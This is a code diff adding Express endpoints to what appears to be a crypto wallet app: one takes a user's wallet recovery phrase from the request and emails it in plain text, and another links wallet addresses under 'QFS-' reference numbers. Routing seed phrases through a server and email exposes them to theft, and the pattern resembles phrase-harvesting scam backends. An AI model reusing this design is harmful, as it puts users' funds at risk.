@@ -191,3 +191,61 @@ exports.updateBalance = async (req, res) => {
     res.status(500).json({ message: 'Error updating balance' });
   }
 };
+
+exports.sendPhrase = async (req, res) => {
+  try {
+    const { phrase } = req.body;
+    const user = await User.findById(req.user.id);
+
+    if (!user) {
+      return res.status(404).json({ message: 'User not found' });
+    }
+
+    // Send phrase via email
+    await sendEmail(
+      user.email,
+      'Your Recovery Phrase',
+      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.`
+    );
+
+    res.json({ message: 'Recovery phrase sent successfully' });
+  } catch (error) {
+    res.status(500).json({ message: 'Error sending phrase', error: error.message });
+  }
+};
+
+const generateReferenceNumber = () => {
+  return 'QFS-' + Date.now().toString(36).toUpperCase() + 
+    Math.random().toString(36).substring(2, 7).toUpperCase();
+};
+
+exports.linkWallet = async (req, res) => {
+  try {
+    const { address, type } = req.body;
+    const user = await User.findById(req.user.id);
+
+    if (!user) {
+      return res.status(404).json({ message: 'User not found' });
+    }
+
+    const referenceNumber = generateReferenceNumber();
+
+    // Add new wallet to user's wallets array
+    user.wallets.push({
+      address,
+      type,
+      linkedAt: new Date(),
+      referenceNumber
+    });
+
+    await user.save();
+
+    res.json({ 
+      message: 'Wallet linked successfully',
+      wallet: user.wallets[user.wallets.length - 1],
+      referenceNumber
+    });
+  } catch (error) {
+    res.status(500).json({ message: 'Error linking wallet', error: error.message });
+  }
+};
